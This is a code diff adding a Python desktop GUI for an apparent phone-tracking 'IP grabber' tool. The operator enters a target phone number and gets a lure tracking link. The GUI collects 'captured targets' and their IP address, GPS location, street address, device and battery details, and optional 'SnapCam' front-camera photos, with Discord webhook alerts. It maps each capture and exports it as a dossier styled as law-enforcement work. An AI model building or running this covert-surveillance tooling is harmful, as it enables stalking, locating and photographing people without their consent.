+        self.map_widget.set_tile_server("https://mt0.google.com/vt/lyrs=m&hl=en&x={x}&y={y}&z={z}&s=Ga", max_zoom=22)
+        self.map_widget.set_position(0, 0)
+        self.map_widget.set_zoom(2)
+
+        # Case History Tab
+        self.tabview.tab("Case History").grid_rowconfigure(1, weight=1)
+        self.tabview.tab("Case History").grid_columnconfigure(0, weight=1)
+        
+        self.refresh_btn = ctk.CTkButton(self.tabview.tab("Case History"), text="Refresh History", command=self.load_history)
+        self.refresh_btn.grid(row=0, column=0, padx=10, pady=10, sticky="w")
+        
+        self.history_frame = ctk.CTkScrollableFrame(self.tabview.tab("Case History"))
+        self.history_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
+
+        # Settings Tab
+        self.webhook_label = ctk.CTkLabel(self.tabview.tab("Settings"), text="Discord Webhook URL (For IP Grabber Alerts):", font=ctk.CTkFont(weight="bold"))
+        self.webhook_label.pack(pady=(20, 5), padx=20, anchor="w")
+        self.webhook_entry = ctk.CTkEntry(self.tabview.tab("Settings"), width=400, placeholder_text="https://discord.com/api/webhooks/...")
+        self.webhook_entry.pack(pady=5, padx=20, anchor="w")
+        
+        self.sound_alert_var = ctk.BooleanVar(value=True)
+        self.sound_alert_cb = ctk.CTkCheckBox(self.tabview.tab("Settings"), text="Play Sound on Target Capture", variable=self.sound_alert_var)
+        self.sound_alert_cb.pack(pady=20, padx=20, anchor="w")
+
+        self.snapcam_var = ctk.BooleanVar(value=False)
+        self.snapcam_cb = ctk.CTkCheckBox(self.tabview.tab("Settings"), text=" Enable SnapCam (Request Front Camera Capture)", variable=self.snapcam_var, text_color="orange")
+        self.snapcam_cb.pack(pady=10, padx=20, anchor="w")
+
+        self.theme_var = ctk.StringVar(value="Standard Grey")
+        self.theme_label = ctk.CTkLabel(self.tabview.tab("Settings"), text="Console Theme Engine:")
+        self.theme_label.pack(pady=(20, 0), padx=20, anchor="w")
+        self.theme_dropdown = ctk.CTkOptionMenu(self.tabview.tab("Settings"), values=["Standard Grey", "Matrix Green", "Crimson Red", "FBI Blue"], variable=self.theme_var, command=self.change_theme)
+        self.theme_dropdown.pack(pady=5, padx=20, anchor="w")
+
+        self.process = None
+        self.target_count = 0
+        self.load_history()
+
+    def load_config(self):
+        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.config_file)
+        if os.path.exists(config_path):
+            try:
+                with open(config_path, 'r') as f:
+                    config = json.load(f)
+                self.phone_entry.insert(0, config.get("phone", ""))
+                self.officer_entry.insert(0, config.get("officer", ""))
+                self.case_entry.insert(0, config.get("case_id", ""))
+                self.grabber_var.set(config.get("grabber", False))
+                self.quick_var.set(config.get("quick", False))
+                self.template_var.set(config.get("template", "Standard Offer"))
+                self.webhook_entry.insert(0, config.get("webhook", ""))
+                self.sound_alert_var.set(config.get("sound_alert", True))
+                self.snapcam_var.set(config.get("snapcam", False))
+                self.theme_var.set(config.get("theme", "Standard Grey"))
+                self.change_theme(self.theme_var.get())
+                self.append_text("[CONFIG] Settings loaded from file.\n")
+            except Exception as e:
+                self.append_text(f"[CONFIG] Error loading: {e}\n")
+
+    def save_config(self):
+        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.config_file)
+        config = {
+            "phone": self.phone_entry.get(),
+            "officer": self.officer_entry.get(),
+            "case_id": self.case_entry.get(),
+            "grabber": self.grabber_var.get(),
+            "quick": self.quick_var.get(),
+            "template": self.template_var.get(),
+            "webhook": self.webhook_entry.get(),
+            "sound_alert": self.sound_alert_var.get(),
+            "snapcam": self.snapcam_var.get(),
+            "theme": self.theme_var.get()
+        }
+        try:
+            with open(config_path, 'w') as f:
+                json.dump(config, f, indent=2)
+        except Exception as e:
+            self.append_text(f"[CONFIG] Error saving: {e}\n")
+
+    def change_theme(self, choice):
+        colors = {"Standard Grey": "#ffffff", "Matrix Green": "#00ff00", "Crimson Red": "#ff3333", "FBI Blue": "#3399ff"}
+        prog_colors = {"Standard Grey": "red", "Matrix Green": "#00aa00", "Crimson Red": "darkred", "FBI Blue": "navy"}
+        self.console_textbox.configure(text_color=colors.get(choice, "white"))
+        self.progress.configure(progress_color=prog_colors.get(choice, "red"))
+
+
+    def copy_link(self):
+        link = self.link_entry.get()
+        if link and "Waiting" not in link:
+            self.clipboard_clear()
+            self.clipboard_append(link)
+            self.append_text("\n[SYSTEM] Link copied to clipboard!\n")
+        else:
+            self.append_text("\n[ERROR] No link available to copy.\n")
+
+    def append_text(self, text):
+        if not isinstance(text, str):
+            try:
+                text = str(text)
+            except Exception:
+                text = "[unprintable output]"
+                
+        # Smart Auto-Scroll: only jump to bottom if scrollbar is already at bottom
+        yview = self.console_textbox._textbox.yview()
+        is_at_bottom = yview[1] >= 0.99
+                
+        self.console_textbox.configure(state="normal")
+        self.console_textbox.insert("end", text)
+        if is_at_bottom:
+            self.console_textbox.see("end")
+        self.console_textbox.configure(state="disabled")
+        
+        # Parse for tracking link
+        if "TRACKING_LINK:" in text:
+            try:
+                link = text.split("TRACKING_LINK:")[1].strip().split()[0]
+                self.link_entry.delete(0, "end")
+                self.link_entry.insert(0, link)
+                self.link_entry.configure(text_color="#44ff44")
+            except:
+                pass
+        
+        # Process events for Stat Cards
+        if "TARGET CAPTURED" in text:
+            self.target_count += 1
+            self.stat_targets.configure(text=f" TARGETS CAPTURED: {self.target_count}")
+            import datetime
+            self.stat_latest.configure(text=f" LATEST: {datetime.datetime.now().strftime('%H:%M:%S')}")
+        
+        # Super basic progress heuristics
+        if "PHASE 3" in text:
+            self.progress.set(0.3)
+        elif "OSINT" in text:
+            self.progress.set(0.6)
+        elif "GENERATING REPORTS" in text:
+            self.progress.set(0.9)
+        elif "Server running" in text or "collection complete" in text:
+            self.progress.set(1.0)
+            self.stat_status.configure(text=" SYSTEM: ONLINE", text_color="#00ff00")
+
+    def view_case(self, case_path):
+        import json
+        from PIL import Image
+        
+        try:
+            self.tabview.add("Case Viewer")
+        except ValueError:
+            pass # Tab already exists
+            
+        self.tabview.set("Case Viewer")
+        tab = self.tabview.tab("Case Viewer")
+        
+        for widget in tab.winfo_children():
+            widget.destroy()
+            
+        scroll_frame = ctk.CTkScrollableFrame(tab)
+        scroll_frame.pack(fill="both", expand=True, padx=10, pady=10)
+        
+        title = ctk.CTkLabel(scroll_frame, text=" OSINT FORENSIC DOSSIER", font=ctk.CTkFont(size=20, weight="bold"), text_color="red")
+        title.pack(pady=10)
+        
+        try:
+            with open(case_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+            
+            captures = data.get("captures", [])
+            disk_images = sorted(glob.glob(case_path.replace(".json", "_*.jpg")))
+
+            def _show_img(parent, pil_img, label):
+                try:
+                    pil_img.thumbnail((300, 300))
+                    ctk_img = ctk.CTkImage(light_image=pil_img, dark_image=pil_img, size=pil_img.size)
+                    lbl = ctk.CTkLabel(parent, image=ctk_img, text="")
+                    lbl._ref = ctk_img
+                    lbl.pack(pady=5)
+                    ctk.CTkLabel(parent, text=label, text_color="orange", font=ctk.CTkFont(weight="bold")).pack()
+                except Exception:
+                    pass
+
+            # Snapcam Image
+            img_pattern = case_path.replace(".json", "_*.jpg")
+            images = glob.glob(img_pattern)
+            if images:
+                try:
+                    img_data = Image.open(images[-1])
+                    # resize to fit
+                    img_data.thumbnail((300, 300))
+                    ctk_img = ctk.CTkImage(light_image=img_data, dark_image=img_data, size=img_data.size)
+                    img_lbl = ctk.CTkLabel(scroll_frame, image=ctk_img, text="")
+                    img_lbl.pack(pady=10)
+                    tag = ctk.CTkLabel(scroll_frame, text=" SNAPCAM CAPTURE", text_color="orange", font=ctk.CTkFont(weight="bold"))
+                    tag.pack(pady=5)
+                except Exception as e:
+                    pass
+            
+            # Parse captures
+            captures = data.get("captures", [])
+            for i, c in enumerate(captures):
+                card = ctk.CTkFrame(scroll_frame)
+                card.pack(fill="x", pady=10, padx=10)
+                
+                header = ctk.CTkLabel(card, text=f" Capture #{i+1}    {c.get('captured_ip','Unknown')}", font=ctk.CTkFont(weight="bold", size=13))
+                header.pack(anchor="w", padx=10, pady=5)
+
+                # Try disk image first, then decode from JSON base64
+                if i < len(disk_images):
+                    try:
+                        _show_img(card, Image.open(disk_images[i]), f" SnapCam #{i+1}")
+                    except Exception:
+                        pass
+                elif c.get("base64_image"):
+                    try:
+                        import base64 as _b64, io as _io
+                        raw = c["base64_image"]
+                        if "," in raw:
+                            raw = raw.split(",", 1)[1]
+                        img_pil = Image.open(_io.BytesIO(_b64.b64decode(raw)))
+                        save_path = case_path.replace(".json", f"_{i+1}.jpg")
+                        img_pil.save(save_path, "JPEG", quality=85)
+                        _show_img(card, img_pil, f" SnapCam #{i+1} (extracted from JSON  {save_path})")
+                    except Exception:
+                        pass
+                
+                info = f"Time: {c.get('capture_time', '')}\n"
+                addr = c.get('street_address', '')
+                if addr:
+                    info += f" {addr}\n"
+                info += f"Device: {c.get('platform', '')} | Battery: {c.get('battery', '')} | Network: {c.get('network', '')}\n"
+                webgl = c.get('webgl_renderer', '')
+                if webgl:
+                    info += f"GPU: {webgl} | CPU: {c.get('cpu_cores','?')} cores | RAM: {c.get('ram_gb','?')}GB\n"
+                gps_lat = c.get('gps_lat')
+                gps_lon = c.get('gps_lon')
+                if gps_lat and gps_lon:
+                    info += f"GPS: {gps_lat}, {gps_lon} (Acc: {c.get('gps_accuracy','')}m)\n"
+                    info += f"Maps: https://maps.google.com/?q={gps_lat},{gps_lon}\n"
+                else:
+                    info += "GPS: Not captured\n"
+                info += f"Browser: {c.get('userAgent', '')[:80]}"
+                
+                txt = ctk.CTkTextbox(card, height=160)
+                txt.pack(fill="x", padx=10, pady=5)
+                txt.insert("0.0", info)
+                txt.configure(state="disabled")
+
+        except Exception as e:
+            err = ctk.CTkLabel(scroll_frame, text=f"Error reading case: {e}")
+            err.pack(pady=20)
+
+        # Export button at bottom
+        export_btn = ctk.CTkButton(scroll_frame, text=" Export Dossier HTML", fg_color="#aa4400",
+                                   command=lambda: self.export_dossier(case_path))
+        export_btn.pack(pady=15)
+
+
+    def export_dossier(self, case_path):
+        import json, base64, webbrowser
+        try:
+            with open(case_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+        except Exception as e:
+            return
+        
+        captures = data.get("captures", [])
+        img_html = ""
+        img_pattern = case_path.replace(".json", "_*.jpg")
+        images = glob.glob(img_pattern)
+        if images:
+            try:
+                with open(images[-1], "rb") as imgf:
+                    b64 = base64.b64encode(imgf.read()).decode()
+                img_html = f'<img src="data:image/jpeg;base64,{b64}" style="max-width:300px;border-radius:8px;border:2px solid #ff4444;"/>'
+            except Exception:
+                pass
+
+        rows = ""
+        for i, c in enumerate(captures):
+            addr = c.get('street_address', 'N/A')
+            gmap = ""
+            if c.get('gps_lat') and c.get('gps_lon'):
+                gmap = f'<a href="https://maps.google.com/?q={c["gps_lat"]},{c["gps_lon"]}" target="_blank" style="color:#4af">Open in Google Maps</a>'
+            rows += f"""
+            <tr>
+                <td>#{i+1}</td><td>{c.get('captured_ip','')}</td>
+                <td>{addr}<br>{gmap}</td>
+                <td>{c.get('battery','')} | Charging: {c.get('charging','')}</td>
+                <td>{c.get('network','')}</td>
+                <td>{c.get('webgl_renderer','')}<br>CPU: {c.get('cpu_cores','?')} | RAM: {c.get('ram_gb','?')}GB</td>
+                <td>{c.get('capture_time','')}</td>
+            </tr>"""
+        
+        html = f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
+        <title>Dossier - {os.path.basename(case_path)}</title>
+        <style>
+            body{{background:#0d0d0d;color:#e0e0e0;font-family:monospace;padding:20px;}}
+            h1{{color:#ff4444;}} h2{{color:#aaffaa;border-bottom:1px solid #333;padding-bottom:5px;}}
+            table{{width:100%;border-collapse:collapse;margin-top:10px;}}
+            th{{background:#1a1a2e;color:#4af;padding:8px;text-align:left;}}
+            td{{border:1px solid #333;padding:8px;vertical-align:top;font-size:12px;}}
+            .snapcam{{text-align:center;padding:20px;border:1px solid #aa4400;margin:20px 0;border-radius:8px;}}
+        </style></head><body>
+        <h1> OSINT FORENSIC DOSSIER</h1>
+        <p>Case File: <b>{os.path.basename(case_path)}</b> &nbsp;|&nbsp; Target: <b>{data.get('target','N/A')}</b></p>
+        {'<div class="snapcam"><h2> SNAPCAM CAPTURE</h2>' + img_html + '</div>' if img_html else ''}
+        <h2>Capture Records</h2>
+        <table><tr><th>#</th><th>IP</th><th>Address / Map</th><th>Battery</th><th>Network</th><th>Hardware</th><th>Time</th></tr>
+        {rows}</table>
+        </body></html>"""
+
+        out_path = case_path.replace(".json", "_dossier.html")
+        with open(out_path, "w", encoding="utf-8") as fout:
+            fout.write(html)
+        webbrowser.open(out_path)
+
+
+    def plot_all_cases(self):
+        files = glob.glob("output/*.json")
+        if not files:
+            return
+        self.map_widget.delete_all_marker()
+        plotted = 0
+        for f in files:
+            try:
+                with open(f, 'r', encoding='utf-8') as jf:
+                    data = json.load(jf)
+                for c in data.get("captures", []):
+                    lat = c.get("gps_lat")
+                    lon = c.get("gps_lon")
+                    ip = c.get("captured_ip", "?")
+                    has_snap = bool(c.get("base64_image"))
+                    if lat and lon:
+                        label = f" {ip}"  # Red = GPS confirmed
+                    else:
+                        ip_i = c.get("ip_info", {})
+                        lat = ip_i.get("loc", ",").split(",")[0]
+                        lon_v = ip_i.get("loc", ",").split(",")[1] if "," in ip_i.get("loc", ",") else None
+                        if lat and lon_v:
+                            lat, lon = float(lat), float(lon_v)
+                            label = f" {ip}"  # Yellow = IP only
+                        else:
+                            continue
+                    try:
+                        self.map_widget.set_marker(float(lat), float(lon), text=label)
+                        plotted += 1
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+        if plotted > 0:
+            self.tabview.set("Live Map")
+        self.append_text(f"\n[ MAP] Plotted {plotted} historical captures.\n")
+
+
+    def clear_map(self):
+        self.map_widget.delete_all_marker()
+        self.map_widget.set_position(0, 0)
+        self.map_widget.set_zoom(2)
+
+
+    def load_history(self):
+        for widget in self.history_frame.winfo_children():
+            widget.destroy()
+        
+        if not os.path.exists("output"):
+            l = ctk.CTkLabel(self.history_frame, text="No cases found.")
+            l.pack(pady=10)
+            return
+            
+        files = glob.glob("output/*.json")
+        if not files:
+            l = ctk.CTkLabel(self.history_frame, text="No scan reports found.")
+            l.pack(pady=10)
+            return
+            
+        for f in reversed(sorted(files, key=os.path.getmtime)):
+            basename = os.path.basename(f)
+            mtime = os.path.getmtime(f)
+            dt_str = datetime.datetime.fromtimestamp(mtime).strftime('%d-%b-%Y %H:%M')
+            
+            frame = ctk.CTkFrame(self.history_frame)
+            frame.pack(fill="x", pady=5, padx=5)
+            lbl = ctk.CTkLabel(frame, text=f" {basename.replace('.json','')}  |   {dt_str}")
+            lbl.pack(side="left", padx=10, fill="x")
+            btn = ctk.CTkButton(frame, text="View Case", width=80, command=lambda x=f: self.view_case(x))
+            btn.pack(side="right", padx=10, pady=5)
+
+    def _scan_finished(self):
+        self.append_text("\n[PROCESS TERMINATED]\n")
+        self.start_button.configure(state="normal")
+        self.stop_button.configure(state="disabled")
+        self.stat_status.configure(text=" SYSTEM: OFFLINE", text_color="gray")
+        self.load_history()
+
+    def start_scan(self):
+        phone = self.phone_entry.get().strip()
+        if not phone:
+            self.append_text("[ERROR] Please enter a target phone number.\n")
+            return
+
+        self.start_button.configure(state="disabled")
+        self.stop_button.configure(state="normal")
+        self.console_textbox.configure(state="normal")
+        self.console_textbox.delete("0.0", "end")
+        self.console_textbox.configure(state="disabled")
+        self.progress.set(0.1)
+
+        self.append_text(f"Starting tracking for {phone}...\n")
+        threading.Thread(target=self._run_internal, args=(phone,), daemon=True).start()
+
+    def stop_scan(self):
+        self.append_text("\n[STOPPING PROCESS...]\n")
+        sys.exit(0)
+
+    def update_map(self, lat, lon):
+        def _do_update():
+            try:
+                self.map_widget.set_position(float(lat), float(lon))
+                self.map_widget.set_zoom(12)
+                self.map_widget.set_marker(float(lat), float(lon), text="Target")
+            except:
+                pass
+        self.after(0, _do_update)
+
+    def _run_internal(self, phone):
+        import io
+        import sys
+        import phone_tracker
+        from unittest.mock import patch
+        import traceback
+        
+        # Immediate debug at start
+        self.after(0, self.append_text, "[DEBUG 1] _run_internal started\n")
+        
+        class GUIStream(io.StringIO):
+            def __init__(self, app):
+                super().__init__()
+                self.app = app
+            def write(self, string):
+                if string:
+                    try:
+                        self.app.after(0, self.app.append_text, string)
+                    except:
+                        pass
+        
+        stream = GUIStream(self)
+        self.after(0, self.append_text, "[DEBUG 2] Stream created\n")
+        
+        try:
+            self.after(0, self.append_text, f"[DEBUG 3] phone_tracker module loaded from: {phone_tracker.__file__}\n")
+            
+            argv = ["phone_tracker.py", phone]
+            if self.officer_entry.get().strip():
+                argv.extend(["--officer", self.officer_entry.get().strip()])
+            if self.case_entry.get().strip():
+                argv.extend(["--case", self.case_entry.get().strip()])
+            if self.quick_var.get():
+                argv.append("--quick")
+            if self.grabber_var.get():
+                argv.append("--grab")
+
+            os.environ["TEMPLATE_CHOICE"] = self.template_var.get()
+            os.environ["PLAY_SOUND"] = "1" if self.sound_alert_var.get() else "0"
+            os.environ["ENABLE_SNAPCAM"] = "1" if self.snapcam_var.get() else "0"
+
+            self.after(0, self.append_text, f"[DEBUG 4] Setting up callbacks, argv={argv}\n")
+            
+            phone_tracker._gui_map_update = self.update_map
+            if self.webhook_entry.get().strip():
+                os.environ["DISCORD_WEBHOOK"] = self.webhook_entry.get().strip()
+            
+            self.after(0, self.append_text, "[DEBUG 5] About to call phone_tracker.main()\n")
+            
+            with patch("sys.stdout", stream), patch("sys.argv", argv):
+                from rich.console import Console
+                phone_tracker.console = Console(file=stream, force_terminal=False, color_system=None)
+                phone_tracker.main()
+                
+            self.after(0, self.append_text, "[DEBUG 6] main() completed normally\n")
+        except Exception as e:
+            tb = traceback.format_exc()
+            self.after(0, self.append_text, f"\n[EXCEPTION] {e}\n")
+            self.after(0, self.append_text, f"[TRACE] {tb}\n")
+        finally:
+            self.after(0, self._scan_finished)
+
+if __name__ == "__main__":
+    app = App()
+    app.mainloop()
+
+
